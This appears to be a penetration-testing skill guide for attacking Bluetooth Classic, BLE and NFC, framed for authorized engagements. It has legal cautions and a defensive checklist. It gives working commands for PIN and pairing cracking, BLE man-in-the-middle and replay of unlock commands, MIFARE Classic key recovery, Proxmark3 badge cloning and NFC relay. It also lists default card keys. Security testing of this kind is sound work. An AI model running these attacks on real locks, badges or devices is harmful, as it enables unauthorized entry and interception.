---
name: attacking-bluetooth-nfc
description: Attack Bluetooth Classic, BLE, and NFC targets -- device enumeration, GATT characteristic exploitation, BLE MITM and replay, Ubertooth and nRF sniffing, MIFARE Classic cracking, Proxmark3 card cloning, NFC relay attacks, and access control bypass. Use when pentesting BLE peripherals or IoT devices, assessing NFC-based access controls or contactless payment security, testing Bluetooth pairing and authentication, or evaluating physical access card cloneability.
---

# Attacking Bluetooth and NFC

Bluetooth and NFC share a property with early Wi-Fi -- the protocols were designed for convenience in a trusted physical environment, and the trust assumption no longer holds. BLE devices routinely transmit sensitive data in cleartext because the GATT characteristic was "internal", and NFC access cards rely on cryptography that was broken years ago. Physical proximity is not access control.

## When to Use

- Assessing BLE peripherals or IoT devices with Bluetooth interfaces
- Testing NFC-based physical access controls (badge readers, door locks)
- Evaluating contactless payment card or transit card security
- Pentesting Bluetooth Classic services (RFCOMM, OBEX, SDP)
- Sniffing or intercepting BLE communication between device and app
- Cloning or replaying NFC/RFID credentials

**Scope and authorization.** RF work has a legal profile the rest of pentesting
does not, because you cannot confine a radio to the target:

- **Interception is wiretap law.** Capturing BLE or Bluetooth Classic traffic
  sweeps in whatever else is transmitting nearby — staff phones, medical
  devices, neighbouring tenants. In the US that implicates the Wiretap Act and
  ECPA; most jurisdictions have an equivalent. Test in a shielded enclosure or
  a controlled area where you can account for every device you capture, and
  discard non-target captures without analysing them.
- **Transmitting is regulated.** Jamming, active BLE injection, and
  high-power relay setups can violate FCC Part 15 (or national equivalent)
  regardless of who owns the target device.
- **Cloned access credentials are physical keys.** A duplicated badge is
  forgery-adjacent in many jurisdictions and gets you into spaces the
  engagement may not cover. Enumerate which doors are in scope before you
  clone, log every credential you produce, and destroy the clones at the end.

Get physical-site authorization, an RF testing window, and a device inventory
in writing — and carry the authorization letter, because RF testing is the
scenario where you are most likely to be physically challenged mid-test.

## When NOT to Use

- **Wi-Fi attacks** -- use `attacking-wireless-networks`
- **Device firmware extraction and analysis beyond the RF interface** -- use `analyzing-firmware-images`
- **Mobile app security beyond the BLE communication layer** -- use `testing-mobile-applications`

## Bluetooth Classic

### Discovery and Enumeration

```bash
hcitool scan                              # Discoverable devices
hcitool inq                               # Extended inquiry (class, RSSI)
hcitool info AA:BB:CC:DD:EE:FF            # Name, class, features
hciconfig -a                              # Local adapters

# bluetoothctl interactive
bluetoothctl
# scan on / devices / info AA:BB:CC:DD:EE:FF
```

### Service Discovery and RFCOMM

```bash
# SDP enumeration
sdptool browse AA:BB:CC:DD:EE:FF          # All services
sdptool search SP AA:BB:CC:DD:EE:FF       # Serial Port profile
sdptool search OPUSH AA:BB:CC:DD:EE:FF    # OBEX Push

# Connect to RFCOMM channel
rfcomm connect /dev/rfcomm0 AA:BB:CC:DD:EE:FF 1
screen /dev/rfcomm0 115200                # Interact as serial device
```

### PIN Brute-Forcing

```bash
spooftooph -i hci0 -a AA:BB:CC:DD:EE:FF  # Spoof BT identity
btcrack <bd_addr_file> <pairing_capture>  # Offline PIN cracking
crackle -i capture.pcap -o decrypted.pcap # Crack BLE legacy pairing TK
```

## BLE (Bluetooth Low Energy)

### Scanning and GATT Enumeration

```bash
hcitool lescan                            # Discover BLE devices
bettercap -eval "ble.recon on"            # bettercap discovery
# ble.enum AA:BB:CC:DD:EE:FF             # Enumerate services

# gatttool interactive
gatttool -b AA:BB:CC:DD:EE:FF -I
# connect / primary / characteristics / char-desc
# char-read-hnd 0x000e                   # Read by handle
# char-write-req 0x000e 0100             # Write value
# char-write-req 0x000f 0100             # Enable notifications

# bettercap GATT operations
# ble.read AA:BB:CC:DD:EE:FF <svc_uuid> <char_uuid>
# ble.write AA:BB:CC:DD:EE:FF <svc_uuid> <char_uuid> <hex>
```

nRF Connect (mobile or desktop) is often fastest for interactive GATT
browsing. Document findings with screenshots for characteristic UUIDs
and properties.

### Just Works Pairing

BLE "Just Works" provides no MITM protection. The Temporary Key is zero,
so any observer within range can derive the Short-Term Key and decrypt
traffic. If the device uses Just Works, report it -- Secure Connections
with numeric comparison or passkey entry is the minimum.

## BLE Attack Patterns

### MITM with GATTacker or BtleJuice

```bash
# GATTacker -- clone peripheral, proxy all GATT traffic
node scan.js
node advertise.js -a <target_mac>         # Fake peripheral
node central.js -a <target_mac>           # Proxy to real device

# BtleJuice (two BLE adapters required)
btlejuice -u <ws_url> -w                  # Core: connects to real device
btlejuice-proxy -i hci1                   # Proxy: advertises as clone
# Web UI on port 8080 for intercept/modify
```

### Replay Attacks

Many BLE devices use static values for commands (unlock, configure).
Capture the characteristic value, replay it from your own connection.
If no nonce, counter, or session binding exists, the device accepts it.

```bash
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0031        # Capture
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0031 -n <hex>  # Replay
```

Common in smart locks, BLE-enabled safes, and IoT actuators.

### Other BLE Weaknesses

**Plaintext characteristics.** IoT devices frequently expose Wi-Fi
credentials, device tokens, and configuration on readable GATT
characteristics without authentication. Enumerate and read everything.

**Unsigned DFU.** If Device Firmware Update over BLE lacks signature
verification, modified firmware images are accepted. Look for Nordic DFU
Service (UUID 0xFE59) or similar OTA services.

## Bluetooth Sniffing

```bash
# Ubertooth One (Classic)
ubertooth-rx -l <LAP>                     # Follow specific connection
ubertooth-rx -r /tmp/bt.pcap             # Pipe to Wireshark
ubertooth-specan                          # Spectrum analysis

# nRF52840 dongle (BLE)
# Flash nRF Sniffer firmware, then:
wireshark -k -i /dev/ttyACM0              # Select device in toolbar
```

**Wireshark filters:** `btle.advertising_header` (advertising),
`btatt.handle == 0x000e` (specific handle), `btsmp` (pairing traffic).
Use btbb plugin for Ubertooth Classic captures.

## NFC

### Proxmark3

```bash
proxmark3 /dev/ttyACM0                    # Start client

# Card identification
hf search                                 # High-frequency
lf search                                 # Low-frequency

# MIFARE Classic operations
hf mf autopwn                             # Try defaults, then nested/hardnested
hf mf dump                                # Dump entire card
hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF    # Nested attack
hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta  # Hardnested

# Clone and emulate
hf mf restore                             # Write dump to blank card
hf mf sim --1k                            # Emulate card
hf mf csetuid --uid <8_hex>              # Set UID on magic card
```

### MIFARE Classic (Crypto1)

Crypto1 is broken. Key recovery takes seconds to minutes.

**Attack hierarchy:**
1. **Default keys** -- FFFFFFFFFFFF, A0A1A2A3A4A5, D3F7D3F7D3F7. Many
   deployments never change them.
2. **Nested attack** -- one known key recovers all sector keys.
3. **Hardnested attack** -- one known key on any sector derives others.
4. **Darkside attack** -- some variants, no known keys needed.

If MIFARE Classic is the sole access control credential, the finding is
critical.

### MIFARE DESFire

DESFire uses AES/3DES -- direct key recovery is not feasible. Focus on
default application keys (often all zeros), key diversification
weaknesses, and whether the backend validates beyond UID.

### libnfc

```bash
nfc-list                                  # List NFC devices
nfc-mfclassic r a dump.mfd               # Read card
nfc-mfclassic w a dump.mfd               # Write card
```

## NFC and Access Control

### Cloning Badges

```bash
hf 14a reader                             # Read card UID
hf mf autopwn                             # Crack keys
hf mf dump                                # Dump contents
hf mf cload                               # Write to magic clone card
```

Many access control systems check only UID, not encrypted sector data.
UID cloning is trivial and defeats these deployments entirely.

### Relay Attacks (NFCGate)

NFC relay forwards card communication over a network link in real time.
Two Android devices running NFCGate: one near the reader, one near the
victim's card. The reader sees a valid interaction despite the card being
physically elsewhere. Defeats proximity assumptions.

### NDEF Records

```bash
hf mfu ndefread                           # Read NDEF data
# May contain: URLs, Wi-Fi credentials, BT pairing data, app data
```

Writable NFC tags in public spaces can be overwritten with malicious
NDEF records (phishing URLs, rogue Wi-Fi provisioning).

## Common Findings

| Finding | Severity | Notes |
|---|---|---|
| Static BLE pairing / Just Works | High | Passive eavesdropping, MITM |
| Unencrypted GATT characteristics | High | No pairing required to read |
| Replay of static BLE commands | High | No nonce or session binding |
| Default Bluetooth Classic PINs | Medium | 0000/1234, brute-forceable |
| MIFARE Classic access control | Critical | Crypto1 broken; minutes to crack |
| UID-only access validation | Critical | Trivial cloning |
| Unsigned BLE DFU | High | Arbitrary code on device |
| Writable NFC tags, no auth | Medium | Content replacement |
| No mutual authentication | High | Any central can connect |
| Default DESFire app keys | High | All-zero on initial deploy |

## Defensive Review Checklist

- [ ] BLE uses Secure Connections pairing (numeric comparison or passkey)
- [ ] Sensitive GATT characteristics require bonding and encryption
- [ ] BLE commands include session-bound nonces or counters
- [ ] DFU validates firmware signatures before applying
- [ ] NFC cards use DESFire or better, not MIFARE Classic
- [ ] Access control validates sector data, not just UID
- [ ] Card keys diversified per card
- [ ] Public NFC tags read-only or authenticated
- [ ] Bluetooth Classic services require auth before data access
- [ ] Relay mitigations in place (distance bounding, timing)

## Rationalizations to Reject

- *"The device is only accessible within Bluetooth range."* Range
  extenders, directional antennas, and relay attacks stretch 10 meters
  to 100. Proximity is not a security boundary.

- *"We use BLE encryption."* Without Secure Connections, the Temporary
  Key is zero and traffic is decryptable by any passive observer.

- *"The NFC cards use encryption (MIFARE Classic)."* Crypto1 has been
  publicly broken since 2008. Key recovery takes minutes.

- *"Physical access is required, so the risk is low."* A badge on a
  lanyard and a BLE device on a shelf are within reach of anyone who
  can walk through a lobby.

- *"We will detect cloned cards at the backend."* Most deployments do
  not correlate usage patterns or detect concurrent use. Verify with
  evidence.

- *"The BLE characteristic is not documented."* GATT enumeration is
  automatic. Every characteristic is discoverable in seconds.

- *"Our BLE firmware updates use a proprietary format."* Proprietary
  format is not a signing mechanism. No signature check means the
  update is replaceable.

## References

- `attacking-wireless-networks` -- Wi-Fi attacks and wireless reconnaissance
- `analyzing-firmware-images` -- extracting and analyzing device firmware
- `testing-mobile-applications` -- mobile app testing beyond the BLE layer
- `engineering-detections` -- detection rules for Bluetooth and NFC abuse
